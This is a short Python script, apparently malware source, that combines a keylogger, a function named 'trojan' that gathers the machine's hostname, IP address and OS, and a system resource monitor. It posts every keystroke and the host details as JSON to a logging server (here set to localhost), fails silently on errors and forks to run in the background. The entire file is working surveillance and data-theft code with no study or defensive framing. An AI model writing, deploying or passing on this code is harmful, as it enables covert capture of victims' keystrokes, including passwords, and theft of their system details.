import psutil
import time
import os
import socket
import platform
import requests
import threading
from pynput import keyboard

server_url = "http://localhost:5000/log"

def send_log(data):
    try:
        requests.post(server_url, json=data)
    except:
        pass  # Fail silently if server isn't up

def trojan():
    info = {
        "type": "system_info",
        "hostname": socket.gethostname(),
        "ip": socket.gethostbyname(socket.gethostname()),
        "os": platform.platform(),
    }
    send_log(info)

def system_monitor():
    while True:
        data = {
            "type": "resource_monitor",
            "cpu": psutil.cpu_percent(),
            "ram": psutil.virtual_memory().percent,
            "disk": psutil.disk_usage("/").percent,
            "processes": sum(1 for _ in psutil.process_iter())
        }
        send_log(data)
        time.sleep(5)

def on_key_press(key):
    try:
        k = key.char
    except AttributeError:
        k = str(key)

    data = {
        "type": "keystroke",
        "key": k,
        "hostname": socket.gethostname(),
    }
    send_log(data)

def start_keylogger():
    listener = keyboard.Listener(on_press=on_key_press)
    listener.start()

if __name__ == "__main__":
    # Start keylogger in background
    threading.Thread(target=start_keylogger, daemon=True).start()

    # Start system info and monitor logic
    pid = os.fork() if hasattr(os, "fork") else 0
    if pid > 0:
        system_monitor()
    else:
        trojan()


            